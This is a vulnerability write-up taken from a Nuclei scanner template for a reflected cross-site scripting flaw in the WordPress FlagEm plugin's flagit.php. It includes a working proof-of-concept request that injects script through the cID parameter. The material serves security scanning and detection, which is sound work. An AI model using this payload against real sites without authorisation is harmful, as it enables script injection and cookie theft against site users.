# Nuclei Template: WordPress FlagEm - Cross-Site Scripting
**Template ID:** wp-flagem-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`wp-flagem-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress FlagEm plugin contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET {{BaseURL}}/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

## References
- https://www.exploit-db.com/exploits/38674
- https://vulners.com/packetstorm/PACKETSTORM:122505
